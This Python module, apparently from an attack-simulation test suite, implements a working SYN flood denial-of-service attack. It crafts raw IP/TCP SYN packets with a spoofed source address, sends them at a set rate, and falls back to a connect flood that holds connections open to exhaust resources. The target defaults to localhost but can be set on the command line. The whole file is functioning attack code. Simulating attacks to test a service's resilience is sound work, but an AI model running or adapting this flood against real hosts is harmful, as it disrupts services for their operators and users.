"""SYN Flood DDoS simulation using raw sockets."""
from __future__ import annotations

import socket
import struct
import time
import random

try:
    from . import log_attack
except ImportError:
    import sys
    from pathlib import Path
    _tests_dir = Path(__file__).resolve().parent.parent
    if str(_tests_dir) not in sys.path:
        sys.path.insert(0, str(_tests_dir))
    from attack_simulator import log_attack


def _checksum(data: bytes) -> int:
    """Compute IP-style checksum."""
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff


def run_syn_flood(target: str = "127.0.0.1", port: int = 8080,
                  duration: float = 5.0, rate: int = 100) -> float:
    """Send SYN packets at high rate to simulate DDoS.

    Uses raw sockets to craft TCP SYN packets. Requires root/pcap permissions.
    Falls back to regular connect() flood if raw socket unavailable.
    """
    start = time.time()
    sent = 0

    # Try raw socket approach first
    use_raw = False
    try:
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        use_raw = True
    except PermissionError:
        print("[ddos] Raw socket denied — falling back to connect() flood")

    if use_raw:
        src_ip = target  # spoof source
        while time.time() - start < duration:
            # Craft IP header + TCP SYN
            ip_ihl = 5
            ip_ver = 4
            ip_tos = 0
            ip_tot_len = 40  # 20 IP + 20 TCP
            ip_id = random.randint(1, 65535)
            ip_frag_off = 0
            ip_ttl = 64
            ip_proto = socket.IPPROTO_TCP
            ip_saddr = socket.inet_aton(src_ip)
            ip_daddr = socket.inet_aton(target)

            ip_header = struct.pack("!BBHHHBBH4s4s",
                                    (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len,
                                    ip_id, ip_frag_off, ip_ttl, ip_proto, 0,
                                    ip_saddr, ip_daddr)

            tcp_src = random.randint(1024, 65535)
            tcp_seq = random.randint(0, 2**32 - 1)
            tcp_ack = 0
            tcp_doff = 5
            tcp_flags = 0x02  # SYN
            tcp_window = socket.htons(65535)
            tcp_urg = 0

            tcp_header = struct.pack("!HHLLBBHHH",
                                     tcp_src, port, tcp_seq, tcp_ack,
                                     (tcp_doff << 4), tcp_flags, tcp_window,
                                     0, tcp_urg)

            packet = ip_header + tcp_header
            try:
                raw_sock.sendto(packet, (target, 0))
                sent += 1
            except Exception:
                pass
            time.sleep(1.0 / rate)
        raw_sock.close()
    else:
        # Fallback: TCP connect flood
        sockets = []
        start = time.time()
        while time.time() - start < duration:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((target, port))
                sockets.append(sock)
                sent += 1
                # Keep connections alive to consume resources
                if len(sockets) > 50:
                    old = sockets.pop(0)
                    old.close()
            except Exception:
                pass
            time.sleep(0.01)
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

    duration_real = time.time() - start
    log_attack(
        attack_id=f"ddos-{int(start)}",
        attack_type="syn_flood",
        target=f"{target}:{port}",
        duration=duration_real,
        extra={"packets_sent": sent, "rate": rate},
    )
    return duration_real


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="127.0.0.1")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--duration", type=float, default=5.0)
    args = p.parse_args()
    run_syn_flood(args.target, args.port, args.duration)
